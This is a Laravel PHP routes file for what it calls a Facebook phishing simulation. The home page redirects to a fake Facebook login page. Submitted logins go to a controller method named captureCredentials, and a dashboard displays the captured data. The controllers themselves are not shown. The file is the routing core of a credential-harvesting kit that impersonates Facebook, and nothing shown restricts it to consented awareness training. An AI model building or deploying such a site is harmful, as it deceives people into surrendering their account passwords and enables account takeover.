<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\PhishingController;
use App\Http\Controllers\DashboardController;

// Redirect home to facebook login
Route::get('/', function () {
    return redirect('/facebook-login');
});

// Facebook phishing simulation
Route::get('/facebook-login', [PhishingController::class, 'showLoginPage']);
Route::post('/facebook-login', [PhishingController::class, 'captureCredentials']);

// Dashboard to view captured data
Route::get('/dashboard', [DashboardController::class, 'index']);